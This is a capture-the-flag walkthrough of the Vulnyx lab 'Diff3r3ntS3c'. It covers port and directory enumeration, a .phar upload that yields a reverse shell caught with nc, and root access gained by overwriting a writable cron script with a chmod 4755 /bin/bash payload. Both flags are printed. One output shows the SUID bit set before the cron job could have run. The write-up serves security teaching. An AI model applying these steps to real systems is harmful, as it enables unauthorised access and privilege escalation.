# Vulnyx: Diff3r3ntS3c

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Low |
| **Creator** | `HackCommander` |
| **Tools used** | `nmap` · `ffuf` · `nc` |
| **URL** | https://vulnyx.com/machines/ |

An upload form accepts `.phar` files, which PHP will execute the same way it does `.php` — a common gap when an extension filter only blocks the more obvious one. That's enough for a reverse shell. Root comes from a cron-triggered backup script that's writable by the current user: overwriting it with a payload that sets the SUID bit on `/bin/bash` is enough once the job fires.

## Enumeration

A full TCP port scan is run first — only **80 (HTTP)** comes back open:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn diff3r3nts3c.nyx

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:C9:50:0B (Oracle VirtualBox virtual NIC)
```

```bash
sudo nmap -p 80 -sCV diff3r3nts3c.nyx

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Diff3r3ntS3c
MAC Address: 08:00:27:C9:50:0B (Oracle VirtualBox virtual NIC)
```

### Web Enumeration

```
http://diff3r3nts3c.nyx
```
<img src="../Images/diff3r3nts3c/Pasted image 20260815152449.png"/>
<img src="../Images/diff3r3nts3c/Pasted image 20260815152508.png"/>

```bash
ffuf -u http://diff3r3nts3c.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

images                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 1ms]
index.html             [Status: 200, Size: 5842, Words: 522, Lines: 137, Duration: 3ms]
uploads                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 0ms]
assets                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 2ms]
.html                  [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 530ms]
.php                   [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 531ms]
generic.html           [Status: 200, Size: 2750, Words: 210, Lines: 63, Duration: 7ms]
elements.html          [Status: 200, Size: 16634, Words: 984, Lines: 363, Duration: 5ms]
.php                   [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 3ms]
.html                  [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 5ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 7ms]
```

### The Upload Form

A benign test upload shows the form's structure — a name, a phone number, and a file field:

```http
POST /uploadData.php HTTP/1.1
Host: diff3r3nts3c.nyx
Content-Type: multipart/form-data; boundary=----geckoformboundary7913cfac05828504976be6e647140432

------geckoformboundary7913cfac05828504976be6e647140432
Content-Disposition: form-data; name="name"

Hacker
------geckoformboundary7913cfac05828504976be6e647140432
Content-Disposition: form-data; name="phone_number"

123456789
------geckoformboundary7913cfac05828504976be6e647140432
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

This is a test.

------geckoformboundary7913cfac05828504976be6e647140432
Content-Disposition: form-data; name="submit"

Upload
------geckoformboundary7913cfac05828504976be6e647140432--
```
<img src="../Images/diff3r3nts3c/Pasted image 20260815152604.png"/>

## Initial Access via `.phar` Upload

`.phar` is a PHP archive format, and depending on how the web server maps extensions to the PHP handler, it can be executed exactly like `.php` — making it a common way around a filter that only checks for the more obvious extension:

```bash
curl -sX GET http://diff3r3nts3c.nyx/uploads/47/rev_shell.phar
```

A listener catches the callback:

```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.91] 33306
Linux Diff3r3ntS3c 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux
 15:11:49 up 14 min,  0 user,  load average: 0.02, 4.91, 5.40
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
```

```bash
$ ls -l /home
total 4
drwx------    5 candidate candidate 4096 Mar 28  2024 candidate
$ ls -l /home/candidate
total 4
-r--------    1 candidate candidate   33 Mar 28  2024 user.txt
$ cat /home/candidate/user.txt
9b71bc22041491a690f7c7b5fe0f4e8d
```

> **User flag:** `9b71bc22041491a690f7c7b5fe0f4e8d`

## Privilege Escalation

### Writable Backup Script via Cron

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh
```

A backup script is run periodically, and it's writable by the current user:

```bash
$ ls -l /home/candidate/.scripts
total 4
-rwxrwxrwx    1 candidate candidate   399 Mar 28  2024 makeBackup.sh
$ cat /home/candidate/.scripts/makeBackup.sh
#!/bin/bash

# Source folder to be backed up
source_folder="/var/www/html/uploads/"

# Destination folder for the backup
backup_folder="/home/candidate/.backups/"

# Create backup folder if it doesn't exist
mkdir -p "$backup_folder"

# Backup file name
backup_file="${backup_folder}backup.tar.gz"

# Create a compressed tar archive of the source folder
tar -czf "$backup_file" -C "$source_folder" .
```

Its contents are overwritten entirely with a payload that sets the SUID bit on `/bin/bash`:

```bash
$ ls -l /bin/bash
-rwxr-xr-x    1 root     root       1265648 Apr 23  2023 /bin/bash
$ echo -n 'chmod 4755 /bin/bash' > /home/candidate/.scripts/makeBackup.sh
$ ls -l /bin/bash
-rwsr-xr-x    1 root     root       1265648 Apr 23  2023 /bin/bash
```

Once the cron job fires again, the payload runs with whatever privileges execute it — root's, based on what it enables next:

```bash
$ /bin/bash -p
id
uid=1000(candidate) gid=1000(candidate) euid=0(root) groups=1000(candidate)
ls -l /root
total 4
-r--------    1 root     root            33 Mar 28  2024 root.txt
cat /root/root.txt
24886c4b2777d4359cd3dbd118741dda
```

> **Root flag:** `24886c4b2777d4359cd3dbd118741dda`

## Takeaways

- File upload filters that only check for `.php` are incomplete — PHP recognizes several extensions as executable depending on server configuration (`.phar`, `.phtml`, `.php5`, and others), and any of them can bypass a filter that isn't checking the actual list.
- A cron job's own security depends entirely on the permissions of what it executes — a script owned by root but writable by a lower-privileged user is functionally the same as granting that user root, just on a delay until the job fires.